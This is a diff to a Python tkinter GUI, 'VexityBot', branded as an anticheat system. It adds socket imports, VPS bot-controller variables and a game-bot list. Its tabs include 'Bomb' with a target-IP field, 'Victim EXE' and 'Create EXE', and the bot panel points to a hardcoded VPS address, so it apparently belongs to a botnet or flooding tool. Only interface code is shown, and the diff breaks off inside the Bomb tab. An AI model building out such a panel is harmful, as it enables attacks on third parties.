@@ -26,6 +26,15 @@ import time
 
 from datetime import datetime
 
+import logging
+
+import socket
+
+import json
+
+# Configure logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+logger = logging.getLogger(__name__)
 
 # TSM-Framework Anticheat Color Scheme
 TSM_COLORS = {
@@ -60,7 +69,7 @@ class VexityBotGUI:
         self.root.minsize(800, 600)
 
         
-
+        
         # Set application icon (if available)
 
         try:
@@ -70,7 +79,7 @@ class VexityBotGUI:
         except:
 
             pass
-
+        
         
 
         # Configure style
@@ -78,6 +87,20 @@ class VexityBotGUI:
         self.setup_styles()
 
         
+        
+        # Initialize application state
+
+        self.current_file = None
+
+        self.unsaved_changes = False
+
+        # Initialize VPS Bot Controller variables
+        self.vps_connected = False
+        self.vps_socket = None
+        self.vps_host = "YOUR_VPS_IP_HERE"
+        self.vps_port = 9999
+        self.bot_running = False
+        self.bot_status = {}
 
         # Create main components
 
@@ -90,25 +113,17 @@ class VexityBotGUI:
         self.create_status_bar()
 
         
-
-        # Initialize application state
-
-        self.current_file = None
-
-        self.unsaved_changes = False
-
         
-
         # Bind events
 
         self.bind_events()
 
         
-
+        
         # Center window on screen
 
         self.center_window()
-
+    
     
 
     def setup_styles(self):
@@ -117,11 +132,11 @@ class VexityBotGUI:
         style = ttk.Style()
 
         
-
+        
         # Configure modern theme
 
         style.theme_use('clam')
-
+        
         
 
         # TSM-Framework Dark Theme Configuration
@@ -364,7 +379,7 @@ class VexityBotGUI:
         self.root.option_add('*ScrolledText*selectForeground', TSM_COLORS['text'])
         self.root.option_add('*ScrolledText*insertBackground', TSM_COLORS['primary'])
     
-
+    
     def create_menu_bar(self):
 
         """Create the main menu bar"""
@@ -374,7 +389,7 @@ class VexityBotGUI:
         self.root.config(menu=menubar)
 
         
-
+        
         # File Menu
 
         file_menu = tk.Menu(menubar, tearoff=0)
@@ -394,7 +409,7 @@ class VexityBotGUI:
         file_menu.add_command(label="Exit", command=self.exit_application, accelerator="Ctrl+Q")
 
         
-
+        
         # Edit Menu
 
         edit_menu = tk.Menu(menubar, tearoff=0)
@@ -414,7 +429,7 @@ class VexityBotGUI:
         edit_menu.add_command(label="Replace", command=self.replace_text, accelerator="Ctrl+H")
 
         
-
+        
         # View Menu
 
         view_menu = tk.Menu(menubar, tearoff=0)
@@ -434,7 +449,7 @@ class VexityBotGUI:
         view_menu.add_command(label="Reset Zoom", command=self.reset_zoom, accelerator="Ctrl+0")
 
         
-
+        
         # Tools Menu
 
         tools_menu = tk.Menu(menubar, tearoff=0)
@@ -452,7 +467,7 @@ class VexityBotGUI:
         tools_menu.add_command(label="Settings", command=self.open_settings)
 
         
-
+        
         # Help Menu
 
         help_menu = tk.Menu(menubar, tearoff=0)
@@ -462,7 +477,7 @@ class VexityBotGUI:
         help_menu.add_command(label="Documentation", command=self.show_documentation)
 
         help_menu.add_command(label="About", command=self.show_about)
-
+    
     
 
     def create_toolbar(self):
@@ -504,7 +519,7 @@ class VexityBotGUI:
         ttk.Button(self.toolbar, text="🔐 Stego", command=self.open_steganography, style='TSM.Primary.TButton').pack(side=tk.LEFT, padx=2)
         ttk.Button(self.toolbar, text="🔧 Generator", command=self.open_code_generator, style='TSM.Primary.TButton').pack(side=tk.LEFT, padx=2)
     
-
+    
     def create_main_content(self):
 
         """Create the main content area with notebook tabs"""
@@ -518,49 +533,49 @@ class VexityBotGUI:
         self.notebook.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Welcome Tab
 
         self.create_welcome_tab()
 
         
-
+        
         # Code Editor Tab
 
         self.create_code_editor_tab()
 
         
-
+        
         # Database Tab
 
         self.create_database_tab()
 
         
-
+        
         # Data Analysis Tab
 
         self.create_data_analysis_tab()
 
         
-
+        
         # Bots Tab
 
         self.create_bots_tab()
 
         
-
+        
         # AI Management Tab
 
         self.create_ai_management_tab()
 
         
-
+        
         # Bomb Tab
 
         self.create_bomb_tab()
 
         
-
+        
         # Create EXE Tab
 
         self.create_exe_tab()
@@ -569,7 +584,7 @@ class VexityBotGUI:
         # Victim EXE Tab
         self.create_victim_exe_tab()
         
-
+        
         # Screens Tab
 
         self.create_screens_tab()
@@ -578,11 +593,16 @@ class VexityBotGUI:
         # Steganography Tab
         self.create_steganography_tab()
         
-
+        # GameBots Tab
+        self.create_gamebots_tab()
+        
+        # VPS Bot Controller Tab
+        self.create_vps_bot_controller_tab()
+        
         # Settings Tab
 
         self.create_settings_tab()
-
+    
     
 
     def create_welcome_tab(self):
@@ -597,7 +617,7 @@ class VexityBotGUI:
         
         subtitle_label = ttk.Label(welcome_frame, text="TSM-Framework Anticheat System", style='TSM.Heading.TLabel')
         subtitle_label.pack(pady=10)
-
+        
         
 
         # Status indicator
@@ -610,7 +630,7 @@ class VexityBotGUI:
         # Feature overview with TSM styling
         features_frame = ttk.LabelFrame(welcome_frame, text="🎯 Available Features", style='TSM.TLabelframe', padding=20)
         features_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=20)
-
+        
         
 
         # Create feature grid with TSM styling
@@ -675,14 +695,14 @@ class VexityBotGUI:
             value_widget = ttk.Label(stat_frame, text=value, style=style_name)
             value_widget.pack()
     
-
+    
     def create_code_editor_tab(self):
 
         """Create the code editor tab with TSM styling"""
         editor_frame = ttk.Frame(self.notebook, style='TSM.TFrame')
         self.notebook.add(editor_frame, text="💻 Code Editor")
         
-
+        
         # Create text editor with scrollbar
 
         # Create text editor with TSM styling
@@ -707,7 +727,7 @@ class VexityBotGUI:
                                     style='TSM.TCombobox', width=10)
         language_combo.pack(side=tk.LEFT)
         
-
+        
         self.text_editor = scrolledtext.ScrolledText(
 
             text_frame, 
@@ -729,7 +749,7 @@ class VexityBotGUI:
         self.text_editor.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Line numbers (simplified)
 
         self.text_editor.insert(tk.END, "# Welcome to VexityBot Code Editor\n")
@@ -743,7 +763,7 @@ class VexityBotGUI:
         self.text_editor.insert(tk.END, "if __name__ == '__main__':\n")
 
         self.text_editor.insert(tk.END, "    hello_world()\n")
-
+    
     
 
     def create_database_tab(self):
@@ -755,7 +775,7 @@ class VexityBotGUI:
         self.notebook.add(db_frame, text="Database")
 
         
-
+        
         # Database connection frame
 
         conn_frame = ttk.LabelFrame(db_frame, text="Database Connection", padding=10)
@@ -763,7 +783,7 @@ class VexityBotGUI:
         conn_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         ttk.Label(conn_frame, text="Host:").grid(row=0, column=0, sticky=tk.W, padx=5)
 
         self.host_entry = ttk.Entry(conn_frame, width=30)
@@ -773,7 +793,7 @@ class VexityBotGUI:
         self.host_entry.insert(0, "localhost")
 
         
-
+        
         ttk.Label(conn_frame, text="Port:").grid(row=0, column=2, sticky=tk.W, padx=5)
 
         self.port_entry = ttk.Entry(conn_frame, width=10)
@@ -783,7 +803,7 @@ class VexityBotGUI:
         self.port_entry.insert(0, "3306")
 
         
-
+        
         ttk.Label(conn_frame, text="Database:").grid(row=1, column=0, sticky=tk.W, padx=5)
 
         self.db_entry = ttk.Entry(conn_frame, width=30)
@@ -791,7 +811,7 @@ class VexityBotGUI:
         self.db_entry.grid(row=1, column=1, padx=5)
 
         
-
+        
         ttk.Label(conn_frame, text="Username:").grid(row=1, column=2, sticky=tk.W, padx=5)
 
         self.user_entry = ttk.Entry(conn_frame, width=15)
@@ -799,13 +819,13 @@ class VexityBotGUI:
         self.user_entry.grid(row=1, column=3, padx=5)
 
         
-
+        
         ttk.Button(conn_frame, text="Connect", command=self.connect_database).grid(row=2, column=0, padx=5, pady=5)
 
         ttk.Button(conn_frame, text="Disconnect", command=self.disconnect_database).grid(row=2, column=1, padx=5, pady=5)
 
         
-
+        
         # Query area
 
         query_frame = ttk.LabelFrame(db_frame, text="SQL Query", padding=10)
@@ -813,13 +833,13 @@ class VexityBotGUI:
         query_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         
-
+        
         self.query_text = scrolledtext.ScrolledText(query_frame, height=8, font=('Consolas', 10))
 
         self.query_text.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Query buttons
 
         query_btn_frame = ttk.Frame(query_frame)
@@ -827,11 +847,11 @@ class VexityBotGUI:
         query_btn_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Button(query_btn_frame, text="Execute", command=self.execute_query).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(query_btn_frame, text="Clear", command=self.clear_query).pack(side=tk.LEFT, padx=5)
-
+    
     
 
     def create_data_analysis_tab(self):
@@ -843,7 +863,7 @@ class VexityBotGUI:
         self.notebook.add(analysis_frame, text="Data Analysis")
 
         
-
+        
         # Data input frame
 
         input_frame = ttk.LabelFrame(analysis_frame, text="Data Input", padding=10)
@@ -851,7 +871,7 @@ class VexityBotGUI:
         input_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         ttk.Button(input_frame, text="Load CSV", command=self.load_csv).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(input_frame, text="Load Database", command=self.load_from_db).pack(side=tk.LEFT, padx=5)
@@ -859,7 +879,7 @@ class VexityBotGUI:
         ttk.Button(input_frame, text="Generate Sample Data", command=self.generate_sample_data).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Analysis options
 
         options_frame = ttk.LabelFrame(analysis_frame, text="Analysis Options", padding=10)
@@ -867,7 +887,7 @@ class VexityBotGUI:
         options_frame.pack(fill=tk.X, padx=5, pady=5)
 
         
-
+        
         ttk.Button(options_frame, text="Descriptive Statistics", command=self.descriptive_stats).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(options_frame, text="Visualization", command=self.create_visualization).pack(side=tk.LEFT, padx=5)
@@ -875,7 +895,7 @@ class VexityBotGUI:
         ttk.Button(options_frame, text="Machine Learning", command=self.ml_analysis).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Results area
 
         results_frame = ttk.LabelFrame(analysis_frame, text="Results", padding=10)
@@ -883,11 +903,11 @@ class VexityBotGUI:
         results_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
 
         
-
+        
         self.results_text = scrolledtext.ScrolledText(results_frame, font=('Consolas', 10))
 
         self.results_text.pack(fill=tk.BOTH, expand=True)
-
+    
     
 
     def create_bots_tab(self):
@@ -899,7 +919,7 @@ class VexityBotGUI:
         self.notebook.add(bots_frame, text="Bots")
 
         
-
+        
         # Header frame
 
         header_frame = ttk.Frame(bots_frame)
@@ -907,13 +927,13 @@ class VexityBotGUI:
         header_frame.pack(fill=tk.X, padx=10, pady=10)
 
         
-
+        
         title_label = ttk.Label(header_frame, text="🤖 Bot Leaderboard", style='Title.TLabel')
 
         title_label.pack(side=tk.LEFT)
 
         
-
+        
         # VPS Info
 
         vps_info = ttk.Label(header_frame, text="VPS: 191.96.152.162:8080", style='Status.TLabel')
@@ -921,7 +941,7 @@ class VexityBotGUI:
         vps_info.pack(side=tk.RIGHT)
 
         
-
+        
         # Control frame
 
         control_frame = ttk.Frame(bots_frame)
@@ -929,7 +949,7 @@ class VexityBotGUI:
         control_frame.pack(fill=tk.X, padx=10, pady=5)
 
         
-
+        
         ttk.Button(control_frame, text="🔄 Refresh All", command=self.refresh_all_bots).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(control_frame, text="▶️ Start All", command=self.start_all_bots).pack(side=tk.LEFT, padx=5)
@@ -939,7 +959,7 @@ class VexityBotGUI:
         ttk.Button(control_frame, text="📊 Statistics", command=self.show_bot_statistics).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Create main content frame with scrollbar
 
         main_content_frame = ttk.Frame(bots_frame)
@@ -947,7 +967,7 @@ class VexityBotGUI:
         main_content_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
 
         
-
+        
         # Create canvas and scrollbar for the leaderboard
 
         canvas = tk.Canvas(main_content_frame, bg='#f8f9fa')
@@ -957,7 +977,7 @@ class VexityBotGUI:
         scrollable_frame = ttk.Frame(canvas)
 
         
-
+        
         scrollable_frame.bind(
 
             "<Configure>",
@@ -967,13 +987,13 @@ class VexityBotGUI:
         )
 
         
-
+        
         canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
 
         canvas.configure(yscrollcommand=scrollbar.set)
 
         
-
+        
         # Pack canvas and scrollbar
 
         canvas.pack(side="left", fill="both", expand=True)
@@ -981,19 +1001,19 @@ class VexityBotGUI:
         scrollbar.pack(side="right", fill="y")
 
         
-
+        
         # Store canvas reference for scrolling
 
         self.bots_canvas = canvas
 
         
-
+        
         # Create leaderboard entries
 
         self.create_leaderboard_entries(scrollable_frame)
 
         
-
+        
         # Bind mousewheel to canvas
 
         def _on_mousewheel(event):
@@ -1001,7 +1021,7 @@ class VexityBotGUI:
             canvas.yview_scroll(int(-1*(event.delta/120)), "units")
 
         canvas.bind_all("<MouseWheel>", _on_mousewheel)
-
+    
     
 
     def create_leaderboard_entries(self, parent_frame):
@@ -1059,9 +1079,23 @@ class VexityBotGUI:
             {"name": "PsiBot", "status": "Offline", "uptime": "97.7%", "requests": 4990, "rank": 23, "port": 8103},
             {"name": "OmegaBot", "status": "Online", "uptime": "99.9%", "requests": 25000, "rank": 24, "port": 8099}
         ]
+        
+        # GameBot data for the GameBots tab
+        self.gamebot_data = [
+            {"name": "CyberWarrior", "status": "Online", "uptime": "99.9%", "kills": 15420, "rank": 1, "port": 9001, "level": 100, "xp": 2500000, "class": "Assassin"},
+            {"name": "ShadowStrike", "status": "Online", "uptime": "99.8%", "kills": 14230, "rank": 2, "port": 9002, "level": 98, "xp": 2300000, "class": "Ninja"},
+            {"name": "ThunderBolt", "status": "Online", "uptime": "99.7%", "kills": 13890, "rank": 3, "port": 9003, "level": 97, "xp": 2200000, "class": "Mage"},
+            {"name": "FireStorm", "status": "Online", "uptime": "99.6%", "kills": 12540, "rank": 4, "port": 9004, "level": 95, "xp": 2000000, "class": "Pyromancer"},
+            {"name": "IceQueen", "status": "Online", "uptime": "99.5%", "kills": 11870, "rank": 5, "port": 9005, "level": 94, "xp": 1900000, "class": "Cryomancer"},
+            {"name": "DragonSlayer", "status": "Online", "uptime": "99.4%", "kills": 11200, "rank": 6, "port": 9006, "level": 92, "xp": 1800000, "class": "Paladin"},
+            {"name": "GhostHunter", "status": "Online", "uptime": "99.3%", "kills": 10850, "rank": 7, "port": 9007, "level": 91, "xp": 1750000, "class": "Hunter"},
+            {"name": "VoidMaster", "status": "Online", "uptime": "99.2%", "kills": 10230, "rank": 8, "port": 9008, "level": 89, "xp": 1650000, "class": "Warlock"},
+            {"name": "LightBringer", "status": "Maintenance", "uptime": "99.1%", "kills": 9850, "rank": 9, "port": 9009, "level": 87, "xp": 1550000, "class": "Cleric"},
+            {"name": "DarkKnight", "status": "Online", "uptime": "99.0%", "kills": 9420, "rank": 10, "port": 9010, "level": 85, "xp": 1450000, "class": "Death Knight"}
+        ]
 
         
-
+        
         # Header row
 
         header_frame = ttk.Frame(parent_frame)
@@ -1071,7 +1105,7 @@ class VexityBotGUI:
         header_frame.configure(style='Heading.TFrame')
 
         
-
+        
         # Header labels with CSS-style styling
 
         headers = ["Rank", "Bot Name", "Status", "Uptime", "Requests", "Port", "Actions"]
@@ -1107,7 +1141,7 @@ class VexityBotGUI:
             elif i == 6:  # Actions
 
                 label.pack(side=tk.LEFT, padx=(5, 10), pady=5)
-
+        
         
 
         # Create bot entries
@@ -1117,7 +1151,7 @@ class VexityBotGUI:
         for i, bot in enumerate(self.bot_data):
 
             self.create_bot_entry(parent_frame, bot, i)
-
+    
     
 
     def create_bot_entry(self, parent_frame, bot, index):
@@ -1131,7 +1165,7 @@ class VexityBotGUI:
         bot_frame.pack(fill=tk.X, padx=5, pady=2)
 
         
-
+        
         # Alternate row colors for better readability
 
         if index % 2 == 0:
@@ -1141,7 +1175,7 @@ class VexityBotGUI:
         else:
 
             bot_frame.configure(style='Odd.TFrame')
-
+        
         
 
         # Rank (with medal emojis for top 3)
@@ -1159,7 +1193,7 @@ class VexityBotGUI:
         elif bot["rank"] == 3:
 
             rank_text = "🥉 3"
-
+        
         
 
         rank_label = ttk.Label(bot_frame, text=rank_text, font=('Arial', 10, 'bold'))
@@ -1167,7 +1201,7 @@ class VexityBotGUI:
         rank_label.pack(side=tk.LEFT, padx=(10, 5), pady=5)
 
         
-
+        
         # Bot name
 
         name_label = ttk.Label(bot_frame, text=bot["name"], font=('Arial', 10, 'bold'))
@@ -1175,7 +1209,7 @@ class VexityBotGUI:
         name_label.pack(side=tk.LEFT, padx=5, pady=5)
 
         
-
+        
         # Status with color coding
 
         status_text = bot["status"]
@@ -1187,7 +1221,7 @@ class VexityBotGUI:
         status_label.pack(side=tk.LEFT, padx=5, pady=5)
 
         
-
+        
         # Uptime
 
         uptime_label = ttk.Label(bot_frame, text=bot["uptime"], font=('Arial', 10))
@@ -1195,7 +1229,7 @@ class VexityBotGUI:
         uptime_label.pack(side=tk.LEFT, padx=5, pady=5)
 
         
-
+        
         # Requests (formatted with commas)
 
         requests_text = f"{bot['requests']:,}"
@@ -1205,7 +1239,7 @@ class VexityBotGUI:
         requests_label.pack(side=tk.LEFT, padx=5, pady=5)
 
         
-
+        
         # Port
 
         port_label = ttk.Label(bot_frame, text=str(bot["port"]), font=('Arial', 10))
@@ -1213,7 +1247,7 @@ class VexityBotGUI:
         port_label.pack(side=tk.LEFT, padx=5, pady=5)
 
         
-
+        
         # Action buttons
 
         action_frame = ttk.Frame(bot_frame)
@@ -1221,7 +1255,7 @@ class VexityBotGUI:
         action_frame.pack(side=tk.LEFT, padx=(5, 10), pady=5)
 
         
-
+        
         if bot["status"] == "Online":
 
             ttk.Button(action_frame, text="⏹️", command=lambda b=bot: self.stop_bot(b), width=3).pack(side=tk.LEFT, padx=1)
@@ -1241,7 +1275,7 @@ class VexityBotGUI:
             ttk.Button(action_frame, text="▶️", command=lambda b=bot: self.start_bot(b), width=3).pack(side=tk.LEFT, padx=1)
 
             ttk.Button(action_frame, text="⏹️", command=lambda b=bot: self.stop_bot(b), width=3).pack(side=tk.LEFT, padx=1)
-
+        
         
 
         ttk.Button(action_frame, text="📊", command=lambda b=bot: self.view_bot_details(b), width=3).pack(side=tk.LEFT, padx=1)
@@ -1249,11 +1283,11 @@ class VexityBotGUI:
         ttk.Button(action_frame, text="👑", command=lambda b=bot: self.open_bot_admin_panel(b), width=3).pack(side=tk.LEFT, padx=1)
 
         
-
+        
         # Store reference for updates
 
         self.bot_frames.append(bot_frame)
-
+    
     
 
     def create_ai_management_tab(self):
@@ -1265,7 +1299,7 @@ class VexityBotGUI:
         self.notebook.add(ai_frame, text="AI Management")
 
         
-
+        
         # Header frame
 
         header_frame = ttk.Frame(ai_frame)
@@ -1273,13 +1307,13 @@ class VexityBotGUI:
         header_frame.pack(fill=tk.X, padx=10, pady=10)
 
         
-
+        
         title_label = ttk.Label(header_frame, text="🤖 AI Bot Management System", style='Title.TLabel')
 
         title_label.pack(side=tk.LEFT)
 
         
-
+        
         # AI Status indicator
 
         self.ai_status_label = ttk.Label(header_frame, text="🟢 AI Active", foreground="green", font=('Arial', 10, 'bold'))
@@ -1287,7 +1321,7 @@ class VexityBotGUI:
         self.ai_status_label.pack(side=tk.RIGHT)
 
         
-
+        
         # Create main content with two columns
 
         main_content = ttk.Frame(ai_frame)
@@ -1295,7 +1329,7 @@ class VexityBotGUI:
         main_content.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
 
         
-
+        
         # Left column - IP Lookup and Tunnel Detection
 
         left_column = ttk.Frame(main_content)
@@ -1303,7 +1337,7 @@ class VexityBotGUI:
         left_column.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=(0, 5))
 
         
-
+        
         # Right column - AI Bot Management
 
         right_column = ttk.Frame(main_content)
@@ -1311,17 +1345,17 @@ class VexityBotGUI:
         right_column.pack(side=tk.RIGHT, fill=tk.BOTH, expand=True, padx=(5, 0))
 
         
-
+        
         # IP Lookup Section
 
         self.create_ip_lookup_section(left_column)
 
         
-
+        
         # AI Bot Management Section
 
         self.create_ai_bot_management_section(right_column)
-
+    
     
 
     def create_ip_lookup_section(self, parent_frame):
@@ -1335,7 +1369,7 @@ class VexityBotGUI:
         ip_frame.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         # IP Input
 
         input_frame = ttk.Frame(ip_frame)
@@ -1343,7 +1377,7 @@ class VexityBotGUI:
         input_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Label(input_frame, text="IP Address:").pack(side=tk.LEFT, padx=(0, 5))
 
         self.ip_entry = ttk.Entry(input_frame, width=20)
@@ -1353,13 +1387,13 @@ class VexityBotGUI:
         self.ip_entry.insert(0, "191.96.152.162")
 
         
-
+        
         ttk.Button(input_frame, text="🔍 Lookup", command=self.perform_ip_lookup).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(input_frame, text="🌐 Scan All Bots", command=self.scan_all_bot_ips).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Quick IP buttons
 
         quick_frame = ttk.Frame(ip_frame)
@@ -1367,7 +1401,7 @@ class VexityBotGUI:
         quick_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Label(quick_frame, text="Quick Lookups:").pack(side=tk.LEFT, padx=(0, 5))
 
         ttk.Button(quick_frame, text="VPS", command=lambda: self.quick_lookup("191.96.152.162")).pack(side=tk.LEFT, padx=2)
@@ -1377,7 +1411,7 @@ class VexityBotGUI:
         ttk.Button(quick_frame, text="Google", command=lambda: self.quick_lookup("8.8.8.8")).pack(side=tk.LEFT, padx=2)
 
         
-
+        
         # Results area
 
         results_frame = ttk.LabelFrame(ip_frame, text="Lookup Results", padding=5)
@@ -1385,13 +1419,13 @@ class VexityBotGUI:
         results_frame.pack(fill=tk.BOTH, expand=True, pady=5)
 
         
-
+        
         self.ip_results = scrolledtext.ScrolledText(results_frame, height=12, font=('Consolas', 9))
 
         self.ip_results.pack(fill=tk.BOTH, expand=True)
 
         
-
+        
         # Tunnel Detection Frame
 
         tunnel_frame = ttk.LabelFrame(parent_frame, text="🚇 Tunnel Detection", padding=10)
@@ -1399,7 +1433,7 @@ class VexityBotGUI:
         tunnel_frame.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         ttk.Button(tunnel_frame, text="🔍 Detect Tunnels", command=self.detect_tunnels).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(tunnel_frame, text="📊 Tunnel Stats", command=self.tunnel_statistics).pack(side=tk.LEFT, padx=5)
@@ -1407,13 +1441,13 @@ class VexityBotGUI:
         ttk.Button(tunnel_frame, text="🔄 Refresh", command=self.refresh_tunnel_status).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # Tunnel results
 
         self.tunnel_results = scrolledtext.ScrolledText(tunnel_frame, height=8, font=('Consolas', 9))
 
         self.tunnel_results.pack(fill=tk.BOTH, expand=True, pady=5)
-
+    
     
 
     def create_ai_bot_management_section(self, parent_frame):
@@ -1427,7 +1461,7 @@ class VexityBotGUI:
         ai_control_frame.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         # AI Status and Controls
 
         status_frame = ttk.Frame(ai_control_frame)
@@ -1435,7 +1469,7 @@ class VexityBotGUI:
         status_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Label(status_frame, text="AI Status:").pack(side=tk.LEFT, padx=(0, 5))
 
         self.ai_mode_var = tk.StringVar(value="Auto")
@@ -1445,7 +1479,7 @@ class VexityBotGUI:
         ai_mode_combo.pack(side=tk.LEFT, padx=5)
 
         
-
+        
         ttk.Button(status_frame, text="▶️ Start AI", command=self.start_ai_management).pack(side=tk.LEFT, padx=5)
 
         ttk.Button(status_frame, text="⏹️ Stop AI", command=self.stop_ai_management).pack(side=tk.LEFT, padx=5)
@@ -1453,7 +1487,7 @@ class VexityBotGUI:
         ttk.Button(status_frame, text="🔄 Reset AI", command=self.reset_ai_management).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # AI Management Options
 
         options_frame = ttk.Frame(ai_control_frame)
@@ -1461,25 +1495,25 @@ class VexityBotGUI:
         options_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         self.auto_optimize_var = tk.BooleanVar(value=True)
 
         ttk.Checkbutton(options_frame, text="Auto Optimize Performance", variable=self.auto_optimize_var).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         self.auto_restart_var = tk.BooleanVar(value=True)
 
         ttk.Checkbutton(options_frame, text="Auto Restart Failed Bots", variable=self.auto_restart_var).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         self.load_balance_var = tk.BooleanVar(value=True)
 
         ttk.Checkbutton(options_frame, text="Load Balancing", variable=self.load_balance_var).pack(side=tk.LEFT, padx=5)
 
         
-
+        
         # AI Bot Overview
 
         overview_frame = ttk.LabelFrame(parent_frame, text="📊 AI Bot Overview", padding=10)
@@ -1487,13 +1521,13 @@ class VexityBotGUI:
         overview_frame.pack(fill=tk.BOTH, expand=True, pady=(0, 10))
 
         
-
+        
         # Bot status grid
 
         self.create_ai_bot_grid(overview_frame)
 
         
-
+        
         # AI Actions
 
         actions_frame = ttk.LabelFrame(parent_frame, text="⚡ AI Actions", padding=10)
@@ -1501,13 +1535,13 @@ class VexityBotGUI:
         actions_frame.pack(fill=tk.X)
 
         
-
+        
         action_buttons_frame = ttk.Frame(actions_frame)
 
         action_buttons_frame.pack(fill=tk.X)
 
         
-
+        
         ttk.Button(action_buttons_frame, text="🚀 Optimize All", command=self.ai_optimize_all).pack(side=tk.LEFT, padx=2)
 
         ttk.Button(action_buttons_frame, text="🔄 Restart Failed", command=self.ai_restart_failed).pack(side=tk.LEFT, padx=2)
@@ -1519,7 +1553,7 @@ class VexityBotGUI:
         ttk.Button(action_buttons_frame, text="🛡️ Security Scan", command=self.ai_security_scan).pack(side=tk.LEFT, padx=2)
 
         ttk.Button(action_buttons_frame, text="📊 Analytics", command=self.ai_analytics).pack(side=tk.LEFT, padx=2)
-
+    
     
 
     def create_ai_bot_grid(self, parent_frame):
@@ -1535,7 +1569,7 @@ class VexityBotGUI:
         scrollable_frame = ttk.Frame(canvas)
 
         
-
+        
         scrollable_frame.bind(
 
             "<Configure>",
@@ -1545,17 +1579,17 @@ class VexityBotGUI:
         )
 
         
-
+        
         canvas.create_window((0, 0), window=scrollable_frame, anchor="nw")
 
         canvas.configure(yscrollcommand=scrollbar.set)
 
         
-
+        
         canvas.pack(side="left", fill="both", expand=True)
 
         scrollbar.pack(side="right", fill="y")
-
+        
         
 
         # Create bot grid (6 columns x 4 rows for 24 bots)
@@ -1567,13 +1601,13 @@ class VexityBotGUI:
             col = i % 6
 
             
-
+            
             bot_name = self.bot_data[i]["name"] if i < len(self.bot_data) else f"Bot{i+1}"
 
             bot_status = self.bot_data[i]["status"] if i < len(self.bot_data) else "Unknown"
 
             
-
+            
             # Create bot button
 
             bot_frame = ttk.Frame(scrollable_frame)
@@ -1581,7 +1615,7 @@ class VexityBotGUI:
             bot_frame.grid(row=row, column=col, padx=2, pady=2, sticky="nsew")
 
             
-
+            
             # Bot status indicator
 
             status_color = "green" if bot_status == "Online" else "orange" if bot_status == "Maintenance" else "red"
@@ -1591,7 +1625,7 @@ class VexityBotGUI:
             status_label.pack()
 
             
-
+            
             # Bot name
 
             name_label = ttk.Label(bot_frame, text=bot_name, font=('Arial', 8, 'bold'))
@@ -1599,7 +1633,7 @@ class VexityBotGUI:
             name_label.pack()
 
             
-
+            
             # AI control button
 
             ai_button = ttk.Button(bot_frame, text="🤖", command=lambda b=i: self.ai_manage_bot(b), width=3)
@@ -1607,9 +1641,9 @@ class VexityBotGUI:
             ai_button.pack()
 
             
-
+            
             self.ai_bot_buttons.append(ai_button)
-
+    
     
 
     def create_bomb_tab(self):
@@ -1621,7 +1655,7 @@ class VexityBotGUI:
         self.notebook.add(bomb_frame, text="Bomb")
 
         
-
+        
         # Header frame
 
         header_frame = ttk.Frame(bomb_frame)
@@ -1629,13 +1663,13 @@ class VexityBotGUI:
         header_frame.pack(fill=tk.X, padx=10, pady=10)
 
         
-
+        
         title_label = ttk.Label(header_frame, text="💣 Bomb Interface", style='Title.TLabel')
 
         title_label.pack(side=tk.LEFT)
 
         
-
+        
         # Status indicator
 
         self.bomb_status_label = ttk.Label(header_frame, text="🔴 Ready", foreground="red", font=('Arial', 10, 'bold'))
@@ -1643,7 +1677,7 @@ class VexityBotGUI:
         self.bomb_status_label.pack(side=tk.RIGHT)
 
         
-
+        
         # Main content frame
 
         main_content = ttk.Frame(bomb_frame)
@@ -1651,23 +1685,23 @@ class VexityBotGUI:
         main_content.pack(fill=tk.BOTH, expand=True, padx=10, pady=5)
 
         
-
+        
         # IP Input Section
 
         self.create_ip_input_section(main_content)
 
         
-
+        
         # Control Section
 
         self.create_bomb_control_section(main_content)
 
         
-
+        
         # Results Section
 
         self.create_bomb_results_section(main_content)
-
+    
     
 
     def create_ip_input_section(self, parent_frame):
@@ -1679,7 +1713,7 @@ class VexityBotGUI:
         ip_frame.pack(fill=tk.X, pady=(0, 10))
 
         
-
+        
         # IP Address Input
 
         ip_input_frame = ttk.Frame(ip_frame)
@@ -1687,7 +1721,7 @@ class VexityBotGUI:
         ip_input_frame.pack(fill=tk.X, pady=5)
 
         
-
+        
         ttk.Label(ip_input_frame, text="Target IP:").pack(side=tk.LEFT, padx=(0, 5))
 
         self.bomb_ip_entry = ttk.Entry(ip_input_frame, width=20, font=('Consolas', 10))
@@ -1697,7 +1731,7 @@ class VexityBotGUI:
         self.bomb_ip_entry.insert(0, "1.1.1.1")
 
         
-
+        
         # Port Selection
 
         port_frame = ttk.Frame(ip_input_frame)
@@ -1705,7 +1739,7 @@ class VexityBotGUI:
         port_frame.pack(side=tk.LEFT, padx=10)
 
